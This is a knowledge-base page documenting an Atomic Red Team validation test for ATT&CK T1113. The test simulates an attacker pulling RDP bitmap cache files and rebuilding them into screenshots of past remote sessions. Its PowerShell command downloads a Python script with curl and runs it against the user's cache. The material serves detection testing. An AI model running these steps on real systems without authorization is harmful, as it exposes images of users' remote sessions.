---
atomic_guid: "98f19852-7348-4f99-9e15-6ff4320464c7"
title: "RDP Bitmap Cache Extraction via bmc-tools"
framework: "atomic"
generated: "true"
attack_technique_id: "T1113"
attack_technique_name: "Screen Capture"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1113/T1113.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "98f19852-7348-4f99-9e15-6ff4320464c7"
  - "RDP Bitmap Cache Extraction via bmc-tools"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# RDP Bitmap Cache Extraction via bmc-tools

Simulates an attacker extracting the RDP bitmap cache using the ANSSI "bmc-tools.py" script.
This test requires valid RDP bitmap cache files to exist on the system (usually created after an outgoing RDP connection is made).

## Metadata

- Atomic GUID: 98f19852-7348-4f99-9e15-6ff4320464c7
- Technique: T1113: Screen Capture
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1113/T1113.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1113-screen_capture|T1113]]

## Input Arguments

### cache_path

- description: Path to the RDP Cache directory or specific .bmc file
- type: path
- default: $env:LOCALAPPDATA\Microsoft\Terminal Server Client\Cache

### output_dir

- description: Directory to save reconstructed images
- type: path
- default: $env:TEMP\rdp_screens

## Dependencies

Python must be installed and in the PATH to run bmc-tools.py

### Prerequisite Check

```text
if (Get-Command python -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
```

### Get Prerequisite

```text
Write-Host "Please install Python manually."
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
$url = 'https://raw.githubusercontent.com/ANSSI-FR/bmc-tools/master/bmc-tools.py'
$toolsDir = "$env:TEMP\bmc-tools.py"
 
# create output directory
New-Item -ItemType Directory -Path #{output_dir} -Force | Out-Null

# python script download
& curl.exe -L $url --output $toolsDir
 
# execution step
if (Test-Path $toolsDir) { python $toolsDir -s "#{cache_path}" -d #{output_dir} -b }
```

### Cleanup

```powershell
Remove-Item "$env:TEMP\bmc-tools.py" -ErrorAction SilentlyContinue
Remove-Item #{output_dir} -Recurse -Force -ErrorAction SilentlyContinue
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1113/T1113.yaml)
